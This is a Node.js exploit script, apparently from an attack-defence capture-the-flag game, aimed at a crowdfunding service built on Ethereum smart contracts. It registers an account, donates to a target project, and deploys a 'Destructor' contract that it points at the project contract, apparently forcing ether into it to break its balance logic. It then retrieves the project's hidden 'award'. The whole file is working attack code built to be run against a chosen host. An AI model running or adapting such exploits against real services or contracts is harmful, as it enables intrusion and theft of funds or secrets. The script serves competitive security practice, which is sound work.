#!/usr/bin/env node

import {ethereum} from "./config.js";
import {readFileSync} from "fs";
import {argv} from "node:process";
import {Web3} from "web3";
import fetch from "node-fetch"
import fetchWithCookies, {CookieJar} from "node-fetch-cookies"

const web3 = new Web3(ethereum.node);
const sender = ethereum.accounts[0].address;

const ProjectContract = JSON.parse(readFileSync('../../services/funding/ethereum/artifacts/contracts/Project.sol/Project.json'));
const DestructorContract = JSON.parse(readFileSync('./contracts/Destructor.json'));

function _getUrlPrefix(host) {
    if (process.env.DIRECT_CONNECT)
        return `http://${host}:3001`;
    return `https://${host}`;
}

async function authenticate(url) {
    const cookieJar = new CookieJar("");
    // We assume that nobody has registered this account previously, so we can use any password here
    const body = JSON.stringify({address: sender, password: "b550cb0a11ef7f18913b5431d5b6b897"});
    console.log(`Try to authenticate with address ${sender} and password "b550cb0a11ef7f18913b5431d5b6b897"`);
    const result = await (await fetchWithCookies(cookieJar, `${url}/users`, {method: "POST", body: body, headers: {"Content-Type": "application/json"}})).json();
    if (!result.user_id)
        throw Error(`Can not authenticate: ${JSON.stringify(result)}`)
    return cookieJar;
}

async function donate(projectAddress) {
    const contract = new web3.eth.Contract(ProjectContract.abi, projectAddress);
    console.log(`Donate to project via calling Project.donate() at ${projectAddress}`);
    await contract.methods.donate().send({from: sender, value: web3.utils.toWei(0.05, "ether")});
}

async function deployDestructor() {
    const contract = new web3.eth.Contract(DestructorContract.abi);
    const tx = contract.deploy({
        data: DestructorContract.bytecode
    });
    const receipt = await tx.send({from: sender, value: 1});
    return receipt.options.address;
}

async function hack(url, projectId) {
    let project = (await (await fetch(`${url}/projects/${projectId}`)).json()).project;
    console.log("Trying to hack the project:", project);

    const cookieJar = await authenticate(url);
    await donate(project.address);

    project = (await (await fetch(`${url}/projects/${projectId}`)).json()).project;
    console.log("Project after donating:", project);

    const destructorAddress = await deployDestructor();
    console.log(`Deployed Destructor at ${destructorAddress}`);
    const contract = new web3.eth.Contract(DestructorContract.abi, destructorAddress);
    console.log(`Calling Destructor.destruct(${project.address}) at ${destructorAddress}`);
    await contract.methods.destruct(project.address).send({from: sender});

    project = (await (await fetch(`${url}/projects/${projectId}`)).json()).project;
    console.log("Project after hacking:", project);

    const award = await (await fetchWithCookies(cookieJar, `${url}/projects/${projectId}/award`)).json()
    console.log(`Extracted award: ${JSON.stringify(award)}`);
}

async function main() {
    if (argv.length < 4) {
        console.error(`USAGE: ${argv[1]} <host> <project-id>`);
        process.exit(1);
    }

    const host = argv[2];
    const projectId = parseInt(argv[3])
    const url = _getUrlPrefix(host);

    await hack(url, projectId);
}

main().catch(console.log);